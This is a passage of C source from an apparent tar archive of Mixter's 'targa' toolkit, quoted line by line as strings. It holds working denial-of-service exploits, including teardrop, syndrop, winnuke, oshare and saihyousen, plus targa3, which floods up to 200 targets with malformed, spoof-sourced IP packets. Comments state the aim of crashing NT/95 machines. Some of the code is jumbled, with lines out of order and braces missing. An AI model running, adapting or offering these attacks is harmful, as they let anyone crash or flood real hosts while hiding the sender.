            "  *((u_short *) p_ptr) |= FIX (IP_MF);\t/* IP frag flags and offset */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) = 0x40;\t/* IP TTL */",
            "  byte = IPPROTO_UDP;",
            "  memcpy (p_ptr + 1, &byte, sizeof (u_char));",
            "  p_ptr += 4;\t\t\t/* IP checksum filled in by kernel */",
            "  *((u_long *) p_ptr) = src_ip;\t/* IP source address */",
            "  p_ptr += 4;",
            "  *((u_long *) p_ptr) = dst_ip;\t/* IP destination address */",
            "  p_ptr += 4;",
            "  *((u_short *) p_ptr) = htons (src_prt);\t/* UDP source port */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) = htons (dst_prt);\t/* UDP destination port */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) = htons (8 + PADDING * 2);\t/* UDP total length *//* Increases UDP total length to 48 bytes",
            "\t\t\t\t\t\t\t   Which is too big! */",
            "  if (sendto (sock, packet, IPH + UDPH + PADDING, 0, (struct sockaddr *) &sin,",
            "\t      sizeof (struct sockaddr)) == -1)",
            "    {",
            "      perror (\"\\nsendto\");",
            "      free (packet);",
            "      exit (1);",
            "    }",
            "  /*  We set the fragment offset to be inside of the previous packet's",
            "   *  payload (it overlaps inside the previous packet) but do not include",
            "   *  enough payload to cover complete the datagram.  Just the header will",
            "   *  do, but to crash NT/95 machines, a bit larger of packet seems to work",
            "   *  better.",
            "   */",
            "  p_ptr = &packet[2];\t\t/* IP total length is 2 bytes into the header */",
            "  *((u_short *) p_ptr) = FIX (IPH + MAGIC + 1);",
            "  p_ptr += 4;\t\t\t/* IP offset is 6 bytes into the header */",
            "  *((u_short *) p_ptr) = FIX (MAGIC);",
            "  if (sendto (sock, packet, IPH + MAGIC + 1, 0, (struct sockaddr *) &sin,",
            "\t      sizeof (struct sockaddr)) == -1)",
            "    {",
            "      perror (\"\\nsendto\");",
            "      free (packet);",
            "      exit (1);",
            "    }",
            "  free (packet);",
            "/* syndrop(destination) */",
            "u_long name_resolve (u_char *);",
            "void send_synd (int, u_long, u_long, u_short, u_short, u_long, u_long);",
            "syndrop (char *synd_host)",
            "  int one = 1, count = 0, i, rip_sock;",
            "  u_long src_ip = 0, dst_ip = 0;",
            "  u_short src_prt = 0, dst_prt = 0;",
            "  u_long s_start = 0, s_end = 0;",
            "  struct in_addr addr;",
            "  if ((rip_sock = socket (AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)",
            "    {",
            "      perror (\"raw socket\");",
            "      exit (1);",
            "    }",
            "  if (setsockopt (rip_sock, IPPROTO_IP, IP_HDRINCL, (char *) &one, sizeof (one)) < 0)",
            "    {",
            "      perror (\"IP_HDRINCL\");",
            "      exit (1);",
            "    }",
            "  if (!(dst_ip = name_resolve (synd_host)))",
            "    {",
            "      fprintf (stderr, \"What the hell kind of IP address is that?\\n\");",
            "      exit (1);",
            "    }",
            "  src_ip = rand ();",
            "  srandom ((unsigned) (time ((time_t) 0)));",
            "  src_prt = (random () % 0xffff);",
            "  dst_prt = (random () % 0xffff);",
            "  count = COUNT;",
            "  addr.s_addr = src_ip;",
            "  addr.s_addr = dst_ip;",
            "  for (i = 0; i < count; i++)",
            "    {",
            "      send_synd (rip_sock, src_ip, dst_ip, src_prt, dst_prt, s_start, s_end);",
            "      fprintf (stderr, \"",
            "[1;35m&",
            "[0m\");",
            "    }",
            "  close (rip_sock);",
            "  return (0);",
            " *  Send two IP fragments with pathological offsets.  We use an implementation",
            " *  independent way of assembling network packets that does not rely on any of",
            " *  the diverse O/S specific nomenclature hinderances (well, linux vs. BSD).",
            "void",
            "send_synd (int sock, u_long src_ip, u_long dst_ip, u_short src_prt, u_short dst_prt, u_long seq1, u_long seq2)",
            "  u_char *packet = NULL, *p_ptr = NULL;\t\t/* packet pointers */",
            "  u_char byte;\t\t\t/* a byte */",
            "  struct sockaddr_in sin;\t/* socket protocol structure */",
            "  sin.sin_family = AF_INET;",
            "  sin.sin_port = src_prt;",
            "  sin.sin_addr.s_addr = dst_ip;",
            "  /*",
            "   * Grab some memory for our packet, align p_ptr to point at the beginning",
            "   * of our packet, and then fill it with zeros.",
            "   */",
            "  packet = (u_char *) malloc (IPH + UDPH + PADDING);",
            "  p_ptr = packet;",
            "  bzero ((u_char *) p_ptr, IPH + UDPH + PADDING);\t/* Set it all to zero */",
            "  byte = 0x45;\t\t\t/* IP version and header length */",
            "  memcpy (p_ptr, &byte, sizeof (u_char));",
            "  p_ptr += 2;\t\t\t/* IP TOS (skipped) */",
            "  *((u_short *) p_ptr) = FIX (IPH + UDPH + PADDING);\t/* total length */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) = htons (242);\t/* IP id */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) |= FIX (IP_MF);\t/* IP frag flags and offset */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) = 0x40;\t/* IP TTL */",
            "  byte = IPPROTO_TCP;",
            "  memcpy (p_ptr + 1, &byte, sizeof (u_char));",
            "  p_ptr += 4;\t\t\t/* IP checksum filled in by kernel */",
            "  *((u_long *) p_ptr) = src_ip;\t/* IP source address */",
            "  p_ptr += 4;",
            "  *((u_long *) p_ptr) = dst_ip;\t/* IP destination address */",
            "  p_ptr += 4;",
            "  *((u_short *) p_ptr) = htons (src_prt);\t/* TCP source port */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) = htons (dst_prt);\t/* TCP destination port */",
            "  p_ptr += 2;",
            "  *((u_long *) p_ptr) = seq1;\t/* TCP sequence # */",
            "  p_ptr += 4;",
            "  *((u_long *) p_ptr) = 0;\t/* ack */",
            "  p_ptr += 4;",
            "  *((u_short *) p_ptr) = htons (8 + PADDING * 2);\t/* TCP data offset */",
            "  /* Increases TCP total length to 48 bytes Which is too big! */",
            "  p_ptr += 2;",
            "  *((u_char *) p_ptr) = TH_SYN;\t/* flags: mark SYN */",
            "  p_ptr += 1;",
            "  *((u_short *) p_ptr) = seq2 - seq1;\t/* window */",
            "  *((u_short *) p_ptr) = 0x44;\t/* checksum : this is magic value for NT, W95.  dissasemble M$ C++ to see why, if you have time  */",
            "  *((u_short *) p_ptr) = 0;\t/* urgent */",
            "  if (sendto (sock, packet, IPH + TCPH + PADDING, 0, (struct sockaddr *) &sin,",
            "\t      sizeof (struct sockaddr)) == -1)",
            "    {",
            "      perror (\"\\nsendto\");",
            "      free (packet);",
            "      exit (1);",
            "    }",
            "  /*  We set the fragment offset to be inside of the previous packet's",
            "   *  payload (it overlaps inside the previous packet) but do not include",
            "   *  enough payload to cover complete the datagram.  Just the header will",
            "   *  do, but to crash NT/95 machines, a bit larger of packet seems to work",
            "   *  better.",
            "   */",
            "  p_ptr = &packet[2];\t\t/* IP total length is 2 bytes into the header */",
            "  *((u_short *) p_ptr) = FIX (IPH + MAGIC + 1);",
            "  p_ptr += 4;\t\t\t/* IP offset is 6 bytes into the header */",
            "  *((u_short *) p_ptr) = FIX (MAGIC);",
            "  p_ptr = &packet[24];\t\t/* hop in to the sequence again... */",
            "  *((u_long *) p_ptr) = seq2;\t/* TCP sequence # */",
            "  if (sendto (sock, packet, IPH + MAGIC + 1, 0, (struct sockaddr *) &sin, sizeof (struct sockaddr)) == -1)",
            "    {",
            "      perror (\"\\nsendto\");",
            "      free (packet);",
            "      exit (1);",
            "    }",
            "  free (packet);",
            "/* teardrop(destination) */",
            "u_long name_resolve (u_char *);",
            "void tear_frags (int, u_long, u_long, u_short, u_short);",
            "teardrop (char *tear_host)",
            "  int one = 1, count = 0, i, rip_sock;",
            "  u_long src_ip = 0, dst_ip = 0;",
            "  u_short src_prt = 0, dst_prt = 0;",
            "  struct in_addr addr;",
            "  if ((rip_sock = socket (AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)",
            "    {",
            "      perror (\"raw socket\");",
            "      exit (1);",
            "    }",
            "  if (setsockopt (rip_sock, IPPROTO_IP, IP_HDRINCL, (char *) &one, sizeof (one))",
            "      < 0)",
            "    {",
            "      perror (\"IP_HDRINCL\");",
            "      exit (1);",
            "    }",
            "  if (!(dst_ip = name_resolve (tear_host)))",
            "    {",
            "      fprintf (stderr, \"What the hell kind of IP address is that?\\n\");",
            "      exit (1);",
            "    }",
            "  src_ip = rand ();",
            "  srandom ((unsigned) (time ((time_t) 0)));",
            "  src_prt = (random () % 0xffff);",
            "  dst_prt = (random () % 0xffff);",
            "  count = COUNT;",
            "  addr.s_addr = src_ip;",
            "  addr.s_addr = dst_ip;",
            "  for (i = 0; i < count; i++)",
            "    {",
            "      tear_frags (rip_sock, src_ip, dst_ip, src_prt, dst_prt);",
            "      fprintf (stderr, \"",
            "[1;34m%%",
            "[0m\");",
            "    }",
            "  return (0);",
            " *  Send two IP fragments with pathological offsets.  We use an implementation",
            " *  independent way of assembling network packets that does not rely on any of",
            " *  the diverse O/S specific nomenclature hinderances (well, linux vs. BSD).",
            "void",
            "tear_frags (int sock, u_long src_ip, u_long dst_ip, u_short src_prt,",
            "\t    u_short dst_prt)",
            "  u_char *packet = NULL, *p_ptr = NULL;\t\t/* packet pointers */",
            "  u_char byte;\t\t\t/* a byte */",
            "  struct sockaddr_in sin;\t/* socket protocol structure */",
            "  sin.sin_family = AF_INET;",
            "  sin.sin_port = src_prt;",
            "  sin.sin_addr.s_addr = dst_ip;",
            "  /*",
            "   * Grab some memory for our packet, align p_ptr to point at the beginning",
            "   * of our packet, and then fill it with zeros.",
            "   */",
            "  packet = (u_char *) malloc (IPH + UDPH + TPADDING);",
            "  p_ptr = packet;",
            "  bzero ((u_char *) p_ptr, IPH + UDPH + TPADDING);",
            "  byte = 0x45;\t\t\t/* IP version and header length */",
            "  memcpy (p_ptr, &byte, sizeof (u_char));",
            "  p_ptr += 2;\t\t\t/* IP TOS (skipped) */",
            "  *((u_short *) p_ptr) = FIX (IPH + UDPH + TPADDING);\t/* total length */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) = htons (242);\t/* IP id */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) |= FIX (IP_MF);\t/* IP frag flags and offset */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) = 0x40;\t/* IP TTL */",
            "  byte = IPPROTO_UDP;",
            "  memcpy (p_ptr + 1, &byte, sizeof (u_char));",
            "  p_ptr += 4;\t\t\t/* IP checksum filled in by kernel */",
            "  *((u_long *) p_ptr) = src_ip;\t/* IP source address */",
            "  p_ptr += 4;",
            "  *((u_long *) p_ptr) = dst_ip;\t/* IP destination address */",
            "  p_ptr += 4;",
            "  *((u_short *) p_ptr) = htons (src_prt);\t/* UDP source port */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) = htons (dst_prt);\t/* UDP destination port */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) = htons (8 + TPADDING);\t/* UDP total length */",
            "  if (sendto (sock, packet, IPH + UDPH + TPADDING, 0, (struct sockaddr *) &sin,",
            "\t      sizeof (struct sockaddr)) == -1)",
            "    {",
            "      perror (\"\\nsendto\");",
            "      free (packet);",
            "      exit (1);",
            "    }",
            "  /*  We set the fragment offset to be inside of the previous packet's",
            "   *  payload (it overlaps inside the previous packet) but do not include",
            "   *  enough payload to cover complete the datagram.  Just the header will",
            "   *  do, but to crash NT/95 machines, a bit larger of packet seems to work",
            "   *  better.",
            "   */",
            "  p_ptr = &packet[2];\t\t/* IP total length is 2 bytes into the header */",
            "  *((u_short *) p_ptr) = FIX (IPH + MAGIC + 1);",
            "  p_ptr += 4;\t\t\t/* IP offset is 6 bytes into the header */",
            "  *((u_short *) p_ptr) = FIX (MAGIC);",
            "  if (sendto (sock, packet, IPH + MAGIC + 1, 0, (struct sockaddr *) &sin,",
            "\t      sizeof (struct sockaddr)) == -1)",
            "    {",
            "      perror (\"\\nsendto\");",
            "      free (packet);",
            "      exit (1);",
            "    }",
            "  free (packet);",
            "/* winnuke(destination,repeats) */",
            "int winnuke_s;",
            "char *str = \"bill_loves_you!\";",
            "struct sockaddr_in addr, spoofedaddr;",
            "struct hostent *host;",
            "winnuke_sub (int sock, char *server, int port)",
            "  struct sockaddr_in blah;",
            "  struct hostent *he;",
            "  bzero ((char *) &blah, sizeof (blah));",
            "  blah.sin_family = AF_INET;",
            "  blah.sin_addr.s_addr = inet_addr (server);",
            "  blah.sin_port = htons (port);",
            "  if ((he = gethostbyname (server)) != NULL)",
            "    {",
            "      bcopy (he->h_addr, (char *) &blah.sin_addr, he->h_length);",
            "    }",
            "  else",
            "    {",
            "      if ((blah.sin_addr.s_addr = inet_addr (server)) < 0)",
            "\t  perror (\"gethostbyname()\");",
            "\t  return (-3);",
            "    }",
            "  if (connect (sock, (struct sockaddr *) &blah, 16) == -1)",
            "    {",
            "      perror (\"connect()\");",
            "      close (sock);",
            "      return (-4);",
            "    }",
            "  return 0;",
            "winnuke (char *winnuke_host, int timez)",
            "  int wncounter;",
            "  for (wncounter = 0; wncounter < timez; wncounter++)",
            "    {",
            "      if ((winnuke_s = socket (AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1)",
            "\t  perror (\"socket()\");",
            "\t  exit (-1);",
            "      winnuke_sub (winnuke_s, winnuke_host, WNUKEPORT);",
            "      send (winnuke_s, str, strlen (str), MSG_OOB);",
            "      fprintf (stderr, \"",
            "[1;37m*",
            "[0m\");",
            "      close (winnuke_s);",
            "    }",
            "  return 0;",
            "}\t\t\t\t// this is line 1234 of targa.c, strange coincidence :)",
            "/* 1234 attack(destination) */",
            "int x_resolve (const char *name, unsigned int port,",
            "\t       struct sockaddr_in *addr);",
            "int sub_1234 (int socket, unsigned long spoof_addr,",
            "\t      struct sockaddr_in *dest_addr);",
            "x1234 (char *one_host)",
            "  struct sockaddr_in dest_addr;",
            "  unsigned int i, sock;",
            "  if ((sock = socket (AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)",
            "    return (-1);",
            "  if (x_resolve (one_host, 0, &dest_addr) == -1)",
            "    {",
            "      return (-1);",
            "    }",
            "  for (i = 0; i < 10; i++)",
            "    sub_1234 (sock, rand (), &dest_addr);",
            "  fprintf (stderr, \"",
            "[1;38m!",
            "[0m\");",
            "  close (sock);",
            "  return 0;",
            "x_resolve (const char *name, unsigned int port, struct sockaddr_in *addr)",
            "  struct hostent *host;",
            "  memset (addr, 0, sizeof (struct sockaddr_in));",
            "  addr->sin_family = AF_INET;",
            "  addr->sin_addr.s_addr = inet_addr (name);",
            "  if (addr->sin_addr.s_addr == -1)",
            "    {",
            "      if ((host = gethostbyname (name)) == NULL)",
            "\treturn (-1);",
            "      addr->sin_family = host->h_addrtype;",
            "      memcpy ((caddr_t) & addr->sin_addr, host->h_addr, host->h_length);",
            "    }",
            "  addr->sin_port = htons (port);",
            "  return (0);",
            "unsigned short ",
            "x_cksum (addr, len)",
            "     u_short *addr;",
            "     int len;",
            "  register int nleft = len;",
            "  register u_short *w = addr;",
            "  register int sum = 0;",
            "  u_short answer = 0;",
            "  while (nleft > 1)",
            "    {",
            "      sum += *w++;",
            "      nleft -= 2;",
            "    }",
            "  if (nleft == 1)",
            "    {",
            "      *(u_char *) (&answer) = *(u_char *) w;",
            "      sum += answer;",
            "    }",
            "  sum = (sum >> 16) + (sum & 0xffff);",
            "  sum += (sum >> 16);",
            "  answer = ~sum;",
            "  return (answer);",
            "sub_1234 (int socket, unsigned long spoof_addr, struct sockaddr_in *dest_addr)",
            "  unsigned char *packet;",
            "  struct iphdr *ip;",
            "  struct icmphdr *icmp;",
            "  packet = (unsigned char *) malloc (sizeof (struct iphdr) +",
            "\t\t\t\t     sizeof (struct icmphdr) + 8);",
            "  ip = (struct iphdr *) packet;",
            "  icmp = (struct icmphdr *) (packet + sizeof (struct iphdr));",
            "  memset (ip, 0, sizeof (struct iphdr) + sizeof (struct icmphdr) + 8);",
            "  ip->ihl = 5;",
            "  ip->version = 4;",
            "  ip->id = htons (1234);",
            "  ip->frag_off |= htons (0x2000);",
            "  ip->ttl = 255;",
            "  ip->protocol = IPPROTO_ICMP;",
            "  ip->saddr = spoof_addr;",
            "  ip->daddr = dest_addr->sin_addr.s_addr;",
            "  ip->check = x_cksum (ip, sizeof (struct iphdr));",
            "  icmp->type = 12;",
            "  icmp->code = 0;",
            "  icmp->checksum = x_cksum (icmp, sizeof (struct icmphdr) + 1);",
            "  if (sendto (socket, packet,",
            "\t      sizeof (struct iphdr) + sizeof (struct icmphdr) + 1,",
            "\t      0, (struct sockaddr *) dest_addr,",
            "\t      sizeof (struct sockaddr)) == -1)",
            "    {",
            "      return (-1);",
            "    }",
            "  ip->tot_len = htons (sizeof (struct iphdr) + sizeof (struct icmphdr) + 8);",
            "  ip->frag_off = htons (8 >> 3);",
            "  ip->frag_off |= htons (0x2000);",
            "  ip->check = x_cksum (ip, sizeof (struct iphdr));",
            "  icmp->type = 0;",
            "  icmp->code = 0;",
            "  icmp->checksum = 0;",
            "  if (sendto (socket, packet,",
            "\t      sizeof (struct iphdr) + sizeof (struct icmphdr) + 8,",
            "\t      0, (struct sockaddr *) dest_addr,",
            "\t      sizeof (struct sockaddr)) == -1)",
            "    {",
            "      return (-1);",
            "    }",
            "  free (packet);\t\t// ph33r phr33 w1lly",
            "  return (0);",
            "\t\t\t\t\t /* saihyousen attack(destination) */// this is line no. 1337 :P",
            "int ",
            "saihyousen (char *sai_host)",
            "  int fd, x = 1, hosti = 192, hostii = 168, hostiii = 1, meep = 0;",
            "  int fooport = 1, numpack = 0;",
            "  char funhost[15];",
            "  struct sockaddr_in *p;",
            "  struct hostent *he;",
            "  struct sockaddr sa;",
            "  u_char gram[36] =",
            "    0x45, 0x00, 0x00, 0x26, 0x12, 0x34, 0x00, 0x00, 0xff, 0x11, 0xff, 0x7f,",
            "    0x00, 0x00, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80,",
            "    0x8f, 0x00, 0x12, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff",
            "  };",
            "  fd = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);",
            "  setsockopt (fd, IPPROTO_IP, IP_HDRINCL, (char *) &x, sizeof (x));",
            "  for (numpack = 0; numpack <= 100; numpack++)",
            "    {",
            "      if (meep == 0)",
            "\t  ++hosti;",
            "\t  meep++;",
            "      if (hosti > 254)",
            "\thosti = 1;",
            "      if (meep == 1)",
            "\t  ++hostii;",
            "\t  meep++;",
            "      if (hostii > 254)",
            "\thostii = 1;",
            "      if (meep == 2)",
            "\t  ++hostiii;",
            "\t  meep = 0;",
            "      if (hostiii > 254)",
            "\thostiii = 1;",
            "      sprintf (funhost, \"%i.%i.%i.%i\", hosti, hostii, hostiii, hosti);",
            "      he = gethostbyname (funhost);",
            "      bcopy (*(he->h_addr_list), (gram + 12), 4);",
            "      he = gethostbyname (sai_host);",
            "      bcopy (*(he->h_addr_list), (gram + 16), 4);",
            "      fooport++;",
            "      if (fooport > 65530)",
            "\t  fooport = 1;",
            "      *(u_short *) (gram + 20) = htons ((u_short) fooport);",
            "      *(u_short *) (gram + 22) = htons ((u_short) fooport);",
            "      p = (struct sockaddr_in *) &sa;",
            "      p->sin_family = AF_INET;",
            "      bcopy (*(he->h_addr_list), &(p->sin_addr), sizeof (struct in_addr));",
            "      sendto (fd, &gram, sizeof (gram), 0, (struct sockaddr *) p,",
            "\t      sizeof (struct sockaddr));",
            "    }",
            "  fprintf (stderr, \"",
            "[1;36m+",
            "[0m\");",
            "  close (fd);",
            "  return 1;",
            "/* oshare(destination) */",
            "int osend (int, u_long);",
            "oshare (char *o_host)",
            "  int loopy;",
            "  int socky = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);",
            "  unsigned long desty = inet_addr (o_host);",
            "  for (loopy = 0; loopy < 500; loopy++)",
            "    osend (socky, desty);",
            "  fprintf (stderr, \"",
            "[0;33m|",
            "[0m\");",
            "  close (socky);",
            "  return 1;",
            "osend (int sock_send, u_long dst_addr)",
            "  char *packet;",
            "  int send_status;",
            "  struct iphdr *ip;",
            "  struct sockaddr_in to;",
            "  packet = (char *) malloc (40);",
            "  ip = (struct iphdr *) (packet);",
            "  memset (packet, 0, 40);",
            "  ip->version = 4;",
            "  ip->ihl = sizeof (struct iphdr) / 4;\t//guess it works",
            "  ip->tos = 0x00;",
            "  ip->tot_len = htons (sizeof (struct iphdr) +",
            "\t\t       sizeof (struct udphdr));\t\t//hope it works :P",
            "  ip->id = htons (1999);",
            "  ip->frag_off = htons (16383);",
            "  ip->ttl = 0xff;",
            "  ip->protocol = IPPROTO_UDP;",
            "  ip->saddr = htonl (rand ());",
            "  ip->daddr = dst_addr;",
            "  ip->check = in_cksum ((u_short *) ip, ip->ihl);",
            "  to.sin_family = AF_INET;",
            "  to.sin_port = htons (rand ());",
            "  to.sin_addr.s_addr = dst_addr;",
            "  send_status = sendto (sock_send, packet, 40, 0,",
            "\t\t\t(struct sockaddr *) &to,",
            "\t\t\tsizeof (struct sockaddr));",
            "  free (packet);\t\t// free willy owns",
            "  return (send_status);",
            "/* EOF */",
            "datapool/src/targa3.c",
            "0100644",
            "0000000",
            "0000000",
            "00000013126",
            "07100656420",
            "013477",
            "ustar  ",
            "root",
            "root",
            " * targa3 - 1999 (c) Mixter <mixter@newyorkoffice.com>",
            " * IP stack penetration tool / 'exploit generator'",
            " * Sends combinations of uncommon IP packets to hosts",
            " * to generate attacks using invalid fragmentation, protocol,",
            " * packet size, header values, options, offsets, tcp segments,",
            " * routing flags, and other unknown/unexpected packet values.",
            " * Useful for testing IP stacks, routers, firewalls, NIDS,",
            " * etc. for stability and reactions to unexpected packets.",
            " * Some of these packets might not pass through routers with",
            " * filtering enabled - tests with source and destination host",
            " * on the same ethernet segment gives best effects.",
            " * Example:",
            " * ./targa3 193.116.54.15 192.88.209.18 134.205.131.22 -c 1000",
            " * Linux, *BSD:",
            " * cc -Wall -O2 -s -o targa3 targa3.c",
            " * IRIX, HPUX, OSF (untested yet):",
            " * cc -ldld -o targa3 targa3.c",
            " * Solaris, SunOS:",
            " * cc -lnsl -lsocket -o targa3 targa3.c",
            "#include <stdio.h>",
            "#include <stdlib.h>",
            "#include <string.h>",
            "#include <unistd.h>",
            "#include <fcntl.h>",
            "#include <time.h>",
            "#include <signal.h>",
            "#include <sys/types.h>",
            "#include <sys/stat.h>",
            "#include <sys/socket.h>",
            "u_char rseed[4096];",
            "int rsi, rnd, pid;",
            "#if __BYTE_ORDER == __LITTLE_ENDIAN",
            "#ifndef htons",
            "unsigned short int htons (unsigned short int hostshort);",
            "#endif",
            "#define TONS(n) htons(n)",
            "#elif __BYTE_ORDER == __BIG_ENDIAN",
            "#define TONS(n) (n)",
            "#endif",
            "struct sa_in",
            "    unsigned short int sin_family, sin_port;",
            "    struct",
            "      {",
            "\tunsigned int s_addr;",
            "      }",
            "    sin_addr;",
            "    unsigned char sin_zero[8];",
            "  };",
            "struct iph",
            "  {\t\t\t\t/* IP header */",
            "#if __BYTE_ORDER == __LITTLE_ENDIAN",
            "#define TONS(n) htons(n)",
            "    unsigned char ihl:4;",
            "    unsigned char version:4;",
            "#elif __BYTE_ORDER == __BIG_ENDIAN",
            "#define TONS(n) (n)",
            "    unsigned char version:4;",
            "    unsigned char ihl:4;",
            "#endif",
            "    unsigned char tos;",
            "    unsigned short int tot_len;",
            "    unsigned short int id;",
            "    unsigned short int frag_off;",
            "    unsigned char ttl;",
            "    unsigned char protocol;",
            "    unsigned short int check;",
            "    unsigned int saddr;",
            "    unsigned int daddr;",
            "  };",
            "unsigned long int inet_addr (const char *cp);",
            "unsigned int",
            "realrand (int low, int high)",
            "  int evil[2];",
            "  evil[0] = rseed[rsi];",
            "  evil[1] = rseed[rsi + 1];",
            "  rsi += 2;",
            "  if (evil[0] == 0x00)",
            "    evil[0]++;",
            "  if (evil[1] == 0x00)",
            "    evil[1]++;",
            "  srandom (time (0));",
            "  srand (random () << pid % evil[0] >> evil[1]);\t/* don't ask :P */",
            "  return ((rand () % (int) (((high) + 1) - (low))) + (low));",
            "void",
            "sigh (int sig)",
            "  puts (\" ] ",
            "[0m\\n\");",
            "  exit (0);",
            "main (int argc, char **argv)",
            "  int s = socket (AF_INET, SOCK_RAW, 255);\t/* IPPROTO_RAW */",
            "  int res, psize, loopy, targets = 0, tind, count = -1;",
            "  char *packet, ansi[16];",
            "  struct sa_in sin;",
            "  struct iph *ip;",
            "  u_long target[200];",
            "  int proto[14] =",
            "  {\t\t\t\t/* known internet protcols */",
            "    0, 1, 2, 4, 6, 8, 12, 17, 22, 41, 58, 255, 0,",
            "  };",
            "  int frags[10] =",
            "  {\t\t\t\t/* (un)common fragment values */",
            "    0, 0, 0, 8192, 0x4, 0x6, 16383, 1, 0,",
            "  };",
            "  int flags[7] =",
            "  {\t\t\t\t/* (un)common message flags */",
            "    0, 0, 0, 0x4, 0, 0x1,",
            "  };",
            "  rnd = open (\"/dev/urandom\", O_RDONLY);",
            "  read (rnd, rseed, 4095);",
            "  rsi = 0;",
            "  snprintf (ansi, 15, \"",
            "[%d;3%dm\", realrand (0, 1), realrand (1, 7));",
            "  printf (\"\\t\\t%starga 3.0 by Mixter",
            "[0m\\n\", ansi);",
            "  fflush (stdout);",
            "  if (argc < 2)",
            "    {",
            "      fprintf (stderr, \"usage: %s <ip1> [ip2] ... [-c count]\\n\", argv[0]);",
            "      exit (-1);",
            "    }",
            "  if (argc > 201)",
            "    {",
            "      fprintf (stderr, \"cannot target more than 200 hosts!\\n\");",
            "      exit (-1);",
            "    }",
            "  for (loopy = 1; loopy < argc; loopy++)",
            "    {",
            "      if (strcmp (argv[loopy - 1], \"-c\") == 0)",
            "\t  if (atoi (argv[loopy]) > 1)",
            "\t    count = atoi (argv[loopy]);",
            "\t  continue;",
            "      if (inet_addr (argv[loopy]) != -1)",
            "\t  target[targets] = inet_addr (argv[loopy]);",
            "\t  targets++;",
            "    }",
            "  if (!targets)",
            "    {",
            "      fprintf (stderr, \"no valid ips found!\\n\");",
            "      exit (-1);",
            "    }",
            "  snprintf (ansi, 15, \"",
            "[%d;3%dm\", realrand (0, 1), realrand (1, 7));",
            "  printf (\"%s\\tTargets:\\t%d\\n\", ansi, targets);",
            "  printf (\"\\tCount:\\t\\t\");",
            "  if (count == -1)",
            "    puts (\"infinite\");",
            "  else",
            "    printf (\"%d\\n\", count);",
            "  printf (\"   [ \");",
            "  fflush(0);",
            "  for (res = 0; res < 18; res++)",
            "    signal (res, sigh);",
            "  pid = getpid ();",
            "  psize = sizeof (struct iph) + realrand (128, 512);",
            "  packet = calloc (1, psize);",
            "  ip = (struct iph *) packet;",
            "  setsockopt (s, 0, 3, \"1\", sizeof (\"1\"));\t/* IP_HDRINCL: header included */",
            "  sin.sin_family = PF_INET;",
            "  sin.sin_port = TONS (0);",
            "  while (count != 0)",
            "    {",
            "      if (count != -1)",
            "\tcount--;",
            "      for (loopy = 0; loopy < 0xff;)",
            "\t  for (tind = 0; tind < targets + 1; tind++)",
            "\t    {",
            "\t      sin.sin_addr.s_addr = target[tind];",
            "\t      if (rsi > 4000)",
            "\t\t  read (rnd, rseed, 4095);",
            "\t\t  rsi = 0;",
            "\t      read (rnd, packet, psize);",
            "\t      proto[13] = realrand (0, 255);",
            "\t      frags[9] = realrand (0, 8100);",
            "\t      flags[6] = realrand (0, 0xf);",
            "\t      ip->version = 4;",
            "\t      ip->ihl = 5;",
            "\t      ip->tos = 0;",
            "\t      ip->tot_len = TONS (psize);",
            "\t      ip->id = TONS (realrand (1, 10000));",
            "\t      ip->ttl = 0x7f;",
            "\t      ip->protocol = proto[(int) realrand (0, 13)];",
            "\t      ip->frag_off = TONS (frags[(int) realrand (0, 9)]);",
            "\t      ip->check = 0;",
            "\t      ip->saddr = random ();",
            "\t      ip->daddr = target[tind];",
            "\t      res = sendto (s,",
            "\t\t\t    packet,",
            "\t\t\t    psize,",
            "\t\t\t    flags[(int) realrand (0, 6)],",
            "\t\t\t    (struct sockaddr *) &sin,",
            "\t\t\t    sizeof (struct sockaddr));",
            "\t      if (res)",
            "\t\tloopy++;",
            "\t    }",
            "      snprintf (ansi, 15, \"",
            "[%d;3%dm\", realrand (0, 1), realrand (1, 7));",
            "      printf (\"%s.\", ansi);",
            "      fflush (stdout);",
            "    }",
            "  free (packet);\t\t/* free willy */",
            "  puts (\" ]",
            "[0m\\n\");",
            "  return 0;",
            "/* After cutting this line, md5sum will be 6550270c101b4895c8c0fb4b75881421 */",
            "datapool/src/targa.c",
            "0100644",
            "0000000",
            "0000000",
            "00000103341",
            "07100656341",
            "013415",
            "ustar  ",
            "root",
            "root",
            "/* http://members.xoom.com/i0wnu - code copyright by Mixter */",
            "/* targa.c - copyright by Mixter <mixter@gmx.net>",
            "   version 1.2 - released 3/3/99 - interface to 8",
            "   multi-platform remote denial of service exploits ",
            "   COMING SOON: targa 2 with new DoS integrated!",
            "   This version will compile with all new glibc include files.",
            "   The second IP is now optional and the program has smarter parsing.",
            "   gcc -O2 targa.c -o targa ; strip targa",
            "   _Should_ compile on: Linux 2.0.x - 2.2.x",
            "   Any glibc/glibc2 system, BSD, Solaris",
            "   Changes since 1.0: fixed tcpheader for land(),",
            "   winnukes are disabled in the source for default.",
            "   Will now compile on even more systems... ;) */",
            "/* parts of code copyrighted by their original authors */",
            "/* bonk by route|daemon9 & klepto",
            " * jolt by Jeff W. Roberson (modified by Mixter for overdrop effect)",
            " * land by m3lt",
            " * nestea by humble & ttol",
            " * newtear by route|daemon9",
            " * syndrop by PineKoan",
            " * teardrop by route|daemon9",
            " * winnuke by _eci */",
            "/* these are user definable */",
            "#define LANDPORT \"113\"\t\t/* remote port for land's */",
            "#define LANDREP 5\t\t/* repeat land attack x times */",
            "#define JOLTREP 15\t\t/* repeat jolt attack x times */",
